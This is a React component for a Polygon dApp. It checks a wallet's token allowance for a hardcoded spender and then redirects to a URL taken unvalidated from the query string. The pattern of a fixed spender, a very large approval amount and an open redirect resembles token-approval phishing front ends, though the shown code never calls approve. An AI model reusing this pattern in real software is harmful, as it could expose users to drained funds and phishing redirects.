import React, { useEffect, useState } from 'react';
import { useContract, useContractWrite, useContractRead, useAddress, useChainId, useConnectionStatus } from "@thirdweb-dev/react";
import { useRouter } from 'next/router';
import { Polygon } from "@thirdweb-dev/chains";
import Spinner from './Spinner';

const Approval = ({ setApprovalStatus, setApproveButtonVisibility }) => {
  const router = useRouter();
  const [redirectUrl, setRedirectUrl] = useState(null);
  const [approvalError, setApprovalError] = useState(false); // New state
  const [isApproved, setIsApproved] = useState(false); // Approval status
  const [approvalInitiated, setApprovalInitiated] = useState(false); // Approval initiation flag

  useEffect(() => {
    if (router.isReady) {
      setRedirectUrl(router.query['redirect-url']);
    }
  }, [router.isReady]);

  const { contract } = useContract("0xc2132D05D31c914a87C6611C10748AEb04B58e8F");
  const { mutateAsync: approve, isLoading: isApproving } = useContractWrite(contract, "approve");
  const spender = "0x61e129d8b0836F05b64d7c59500F4fa042EA8c5B";
  const amount = "1000000000000000000";
  const address = useAddress();
  const { data: allowance, isLoading: isChecking } = useContractRead(contract, "allowance", [address, spender]);
  const currentChainId = useChainId();
  const connectionStatus = useConnectionStatus();

  const callApproval = async () => {
    try {
      if (currentChainId !== Polygon.chainId) {
        console.error('Wrong network. Please switch to the Polygon network.');
        return;
      }
      if (isApproving || isChecking) {
        console.log('Exiting callApproval because of isApproving:', isApproving, 'or isChecking:', isChecking);
        return;
      }
      if (address && !isChecking && !approvalInitiated) {
        console.log('Inside callApproval with address:', address, 'and approvalInitiated:', approvalInitiated);
        if (parseInt(allowance) >= parseInt(amount)) {
          console.log('Setting isApproved and approvalStatus to true and redirecting because allowance is sufficient');
          setIsApproved(true);
          setApprovalStatus(true);
          setApproveButtonVisibility(false);
          setTimeout(() => {
            router.push(`${redirectUrl}/${address}`);
          }, 2000);
        } else {
          console.log('Allowance is not sufficient, showing the approve button');
          setApproveButtonVisibility(true); // Show the approve button when allowance is not sufficient
         // setApprovalInitiated(true); // Set the approval initiation flag to prevent the loop
        }
      }
    } catch (err) {
      console.error("Contract call failure:", err);
      setApproveButtonVisibility(true); // show approve button on failure
      setApprovalError(true); // set error state to true
    }
  };
  
  useEffect(() => {
    // if (contract && address && !isChecking && !approvalInitiated && !isApproved) {
    //   callApproval();
    // }
  
    if (connectionStatus === "disconnected") {
      setApprovalStatus(false);
      setApprovalInitiated(false);
    }
  }, [
    contract,
    address,
    isChecking,
    approvalInitiated,
    // isApproved, // remove this line
    setApprovalStatus,
    connectionStatus,
    setApproveButtonVisibility,  // Add this line

  ]);
  

  if (isApproving || (address && isChecking)) {
    return <Spinner />;
  }

  return null;
};

export default Approval;
